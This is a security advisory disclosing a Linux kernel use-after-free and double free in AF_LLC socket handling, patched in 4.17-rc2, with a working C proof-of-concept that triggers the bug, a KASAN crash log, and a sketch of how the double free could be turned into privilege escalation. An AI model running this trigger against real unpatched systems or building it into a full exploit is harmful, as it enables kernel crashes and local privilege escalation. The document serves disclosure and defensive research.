**Vulnerability Summary**<br>
A use after free vulnerability in AF_LLC allows local attackers to control the flow of code that the kernel executes, allowing them to cause it to run arbitrary code and gain elevated privileges.

**Vendor Response**<br>
The vulnerability was reported to the Kernel Security, which asked us to contact the netdev team. A patch was provided by the netdev team, on the 27th of March, and was later integrated into the main code of Linux (we are not certain when).
Attempts to recontact the netdev and understand more on the timeline, went unanswered.
We know that the patch has been introduced as part of:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?h=v4.17-rc2&id=b85ab56c3f81c5a24b5a5213374f549df06430da

**Credit**<br>
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
The oldest known version to be affected Linux version 2.6.39.4, the patch has been introduced as part of 4.17-rc2.

**Vulnerability Details**<br>
LLC sockets can only be created with CAP_NET_RAW capability. Setsockopt() with SO_BINDTODEVICE is necessary to setup sk->sk_bound_dev_if so that bind() won’t fail as well as llc_ui_sendmsg() when checking that llc->addr is initialized.<br>
Then after connecting and sending a message, the code leads to llc_build_and_send_pkt.
The error can be spotted in llc_conn_state_process():

```c
...
 out_kfree_skb:
  kfree_skb(skb);
 out_skb_put:
  kfree_skb(skb);
 return rc;
}
```

The end of the function see 2 consecutive free on the skb which causes a UAF first followed by a double free as seen in the crash log:

```c
void kfree_skb(struct sk_buff *skb)
{
 if (!skb_unref(skb))
  return;
 trace_kfree_skb(skb, __builtin_return_address(0));
 __kfree_skb(skb);
}
```

Exploiting the double free on the struct sk_buff itself is not easy due to that fact that it belongs to its own slab. However, a sk_buff has a kmalloc-ed buffer which is allocated and deallocated side by side with it (cf. https://xairy.github.io/blog/2016/cve-2016-2384). It’s kind of similar to 2 consecutive double free.<br>

We want to target the 2nd free to free any other object with function pointers (in the general kmalloc) so that we can abuse the crafted UAF. A good target could be to free a skb’s buffer and control the destructor_arg in skb_shared_info just like the writeup in the above link.

**Proof of Concept**<br>
```c
#define _GNU_SOURCE
#include <endian.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
struct sockaddr_llc {
 short  sllc_family;
 short  sllc_arphrd;
 unsigned char   sllc_test;
 unsigned char   sllc_xid;
 unsigned char sllc_ua;
 unsigned char   sllc_sap;
 unsigned char   sllc_mac[6];
 unsigned char   __pad[2];
};
void test()
{
 int fd = socket(AF_LLC, SOCK_STREAM, 0);
 char output[32] = "lo";
 socklen_t len;
 setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, &output, 0x10);
 struct sockaddr_llc addr1 = {.sllc_family = AF_LLC, .sllc_sap = 2};
 bind(fd, (const struct sockaddr *)&addr1, sizeof(struct sockaddr_llc));
 struct sockaddr_llc addr2 = {.sllc_family = AF_LLC, .sllc_sap = 2};
 connect(fd, (const struct sockaddr *)&addr2, sizeof(struct sockaddr_llc));
 char msg[0x10] = "aaaa";
 send(fd, msg, 0x10, 0);
}
int main()
{
 test();
 return 0;
}
```

This will result in a (similar to this) crash log:

```
[   23.142123] BUG: KASAN: use-after-free in kfree_skb+0x298/0x2f0
[   23.143012] Read of size 4 at addr ffff8801093d1124 by task poc/207
[   23.143742]
[   23.143892] CPU: 0 PID: 207 Comm: poc Not tainted 4.15.0+ #5
[   23.144396] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.11.0-0-g63451fca13-prebuilt.qemu-project.org 04/01/2014
[   23.145452] Call Trace:
[   23.145694]  dump_stack+0xcc/0x16c
[   23.147098]  print_address_description+0x73/0x290
[   23.147534]  kasan_report+0x277/0x360
[   23.148204]  kfree_skb+0x298/0x2f0
[   23.149829]  llc_conn_state_process+0x12d/0x1260
[   23.150536]  llc_build_and_send_pkt+0x195/0x240
[   23.151135]  llc_ui_sendmsg+0x78b/0x1280
[   23.155716]  sock_sendmsg+0xc5/0x100
[   23.156413]  SYSC_sendto+0x33a/0x580
[   23.163517]  entry_SYSCALL_64_fastpath+0x24/0x87
[   23.164241] RIP: 0033:0x400cfd
[   23.164694] RSP: 002b:00007ffd3d1f4bd8 EFLAGS: 00000246
[   23.164698]
[   23.165766] Allocated by task 207:
[   23.166397]  kasan_kmalloc+0xa0/0xd0
[   23.167071]  kmem_cache_alloc_node+0x100/0x1c0
[   23.167829]  __alloc_skb+0xe2/0x700
[   23.168457]  alloc_skb_with_frags+0x10a/0x690
[   23.169174]  sock_alloc_send_pskb+0x735/0x920
[   23.170156]  llc_ui_sendmsg+0x427/0x1280
[   23.170960]  sock_sendmsg+0xc5/0x100
[   23.171547]  SYSC_sendto+0x33a/0x580
[   23.172280]  entry_SYSCALL_64_fastpath+0x24/0x87
[   23.173460]
[   23.173763] Freed by task 207:
[   23.174261]  kasan_slab_free+0x71/0xc0
[   23.174843]  kmem_cache_free+0x77/0x1e0
[   23.175410]  kfree_skbmem+0x1a1/0x1d0
[   23.175987]  kfree_skb+0x12f/0x2f0
[   23.176541]  llc_conn_state_process+0x120/0x1260
[   23.177406]  llc_build_and_send_pkt+0x195/0x240
[   23.178051]  llc_ui_sendmsg+0x78b/0x1280
[   23.178647]  sock_sendmsg+0xc5/0x100
[   23.179175]  SYSC_sendto+0x33a/0x580
[   23.179702]  entry_SYSCALL_64_fastpath+0x24/0x87
[   23.180368]
[   23.180603] The buggy address belongs to the object at ffff8801093d1040
[   23.180603]  which belongs to the cache skbuff_head_cache of size 232
[   23.182503] The buggy address is located 228 bytes inside of
[   23.182503]  232-byte region [ffff8801093d1040, ffff8801093d1128)
[   23.184255] The buggy address belongs to the page:
[   23.184976] page:ffffea000424f400 count:1 mapcount:0 mapping:   (null) index:0x0 compound_mapcount: 0
[   23.186602] flags: 0x17ffffc0008100(slab|head)
[   23.187722] raw: 0017ffffc0008100 0000000000000000 0000000000000000 0000000180190019
[   23.188919] raw: dead000000000100 dead000000000200 ffff88010dee2540 0000000000000000
[   23.189891] page dumped because: kasan: bad access detected
[   23.190587]
[   23.190788] Memory state around the buggy address:
[   23.191394]  ffff8801093d1000: fc fc fc fc fc fc fc fc fb fb fb fb fb fb fb fb
[   23.192300]  ffff8801093d1080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   23.193238] >ffff8801093d1100: fb fb fb fb fb fc fc fc fc fc fc fc fc fc fc fc
[   23.194352]                                ^
[   23.195089]  ffff8801093d1180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   23.196254]  ffff8801093d1200: fb fb fb fb fb fb fb fb fb fb fb fb fb fc fc fc
[   23.197271] ==================================================================
[   23.198327] Disabling lock debugging due to kernel taint
[   23.199108] ==================================================================
[   23.200025] BUG: KASAN: double-free or invalid-free in           (null)
[   23.200816]
[   23.201047] CPU: 0 PID: 207 Comm: poc Tainted: G    B            4.15.0+ #5
[   23.202212] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.11.0-0-g63451fca13-prebuilt.qemu-project.org 04/01/2014
[   23.203921] Call Trace:
[   23.204323]  dump_stack+0xcc/0x16c
[   23.206271]  print_address_description+0x73/0x290
[   23.207700]  kasan_report_double_free+0x65/0xa0
[   23.208432]  kasan_slab_free+0xa3/0xc0
[   23.209650]  kmem_cache_free+0x77/0x1e0
[   23.210278]  kfree_skbmem+0x1a1/0x1d0
[   23.211509]  kfree_skb+0x12f/0x2f0
[   23.214089]  llc_conn_state_process+0x12d/0x1260
[   23.215088]  llc_build_and_send_pkt+0x195/0x240
[   23.215810]  llc_ui_sendmsg+0x78b/0x1280
[   23.220486]  sock_sendmsg+0xc5/0x100
[   23.221045]  SYSC_sendto+0x33a/0x580
[   23.227676]  entry_SYSCALL_64_fastpath+0x24/0x87
[   23.228398] RIP: 0033:0x400cfd
[   23.228892] RSP: 002b:00007ffd3d1f4bd8 EFLAGS: 00000246
[   23.228896]
[   23.229966] Allocated by task 207:
[   23.230538]  kasan_kmalloc+0xa0/0xd0
[   23.231112]  kmem_cache_alloc_node+0x100/0x1c0
[   23.231824]  __alloc_skb+0xe2/0x700
[   23.232395]  alloc_skb_with_frags+0x10a/0x690
[   23.233118]  sock_alloc_send_pskb+0x735/0x920
[   23.233838]  llc_ui_sendmsg+0x427/0x1280
[   23.234434]  sock_sendmsg+0xc5/0x100
[   23.234947]  SYSC_sendto+0x33a/0x580
[   23.235414]  entry_SYSCALL_64_fastpath+0x24/0x87
[   23.236088]
[   23.236348] Freed by task 207:
[   23.236774]  kasan_slab_free+0x71/0xc0
[   23.237242]  kmem_cache_free+0x77/0x1e0
[   23.237740]  kfree_skbmem+0x1a1/0x1d0
[   23.238202]  kfree_skb+0x12f/0x2f0
[   23.238698]  llc_conn_state_process+0x120/0x1260
[   23.239435]  llc_build_and_send_pkt+0x195/0x240
[   23.240129]  llc_ui_sendmsg+0x78b/0x1280
[   23.240617]  sock_sendmsg+0xc5/0x100
[   23.241086]  SYSC_sendto+0x33a/0x580
[   23.241555]  entry_SYSCALL_64_fastpath+0x24/0x87
[   23.242230]
[   23.242450] The buggy address belongs to the object at ffff8801093d1040
[   23.242450]  which belongs to the cache skbuff_head_cache of size 232
[   23.244066] The buggy address is located 0 bytes inside of
[   23.244066]  232-byte region [ffff8801093d1040, ffff8801093d1128)
[   23.245810] The buggy address belongs to the page:
[   23.246425] page:ffffea000424f400 count:1 mapcount:0 mapping:   (null) index:0x0 compound_mapcount: 0
[   23.247905] flags: 0x17ffffc0008100(slab|head)
[   23.248553] raw: 0017ffffc0008100 0000000000000000 0000000000000000 0000000180190019
[   23.249762] raw: dead000000000100 dead000000000200 ffff88010dee2540 0000000000000000
[   23.250949] page dumped because: kasan: bad access detected
[   23.251809]
[   23.252037] Memory state around the buggy address:
[   23.252782]  ffff8801093d0f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   23.253731]  ffff8801093d0f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   23.254660] >ffff8801093d1000: fc fc fc fc fc fc fc fc fb fb fb fb fb fb fb fb
[   23.255585]                                            ^
[   23.256273]  ffff8801093d1080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   23.257274]  ffff8801093d1100: fb fb fb fb fb fc fc fc fc fc fc fc fc fc fc fc
[   23.258614] ==================================================================
```
